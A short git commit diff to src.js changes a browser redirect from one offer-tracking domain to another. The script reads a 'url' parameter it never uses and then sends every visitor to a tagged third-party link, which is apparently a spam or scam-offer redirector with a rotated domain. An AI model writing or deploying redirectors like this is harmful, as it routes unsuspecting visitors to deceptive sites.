de750b63e7998d1a21604dcaa76078560fd41201
enjoy06 <152522310+enjoy06@users.noreply.github.com>
2025-08-04 20:39:24 +0700

    Update src.js

--- src.js
+++ src.js
@@ -1,3 +1,4 @@
 const looking = new URLSearchParams(window.location.search);
 const directed = looking.get('url');
-window.location.href = 'https://dbajihg.getitoffer.com/s/a6d06e2c50a10?track=BEAUTIFUL&subsource=BEAUTIFUL';
+window.location.href = 'https://dbajihg.postlinksm.com/s/a6d06e2c50a10?track=BEAUTIFUL&subsource=BEAUTIFUL';
+
